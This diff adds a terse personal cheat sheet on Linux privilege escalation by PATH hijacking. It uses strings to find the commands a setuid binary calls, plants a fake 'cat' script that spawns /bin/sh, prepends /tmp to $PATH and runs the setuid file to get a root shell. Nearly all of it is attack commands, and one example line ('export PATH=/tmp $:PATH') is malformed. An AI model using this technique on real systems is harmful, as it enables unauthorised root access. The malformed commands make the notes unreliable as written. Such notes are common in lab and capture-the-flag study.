@@ -1,0 +1,19 @@
+- check what commands used in the setuid-file
+strings -n 8 <setuid-file>
+eg. cat /etc/passwd
+
+- make a bash script with the command name(spawn shell)
+vi cat
+#!/bin/sh
+/bin/sh
+
+- change the $PATH to let the command run there instead of the normal directory
+export PATH=/<hijacked-directory> :$PATH
+eg. export PATH=/tmp $:PATH 
+
+- to verify use which or echo $PATH
+echo $PATH
+which cat
+/tmp/cat
+
+- run the setuid-file
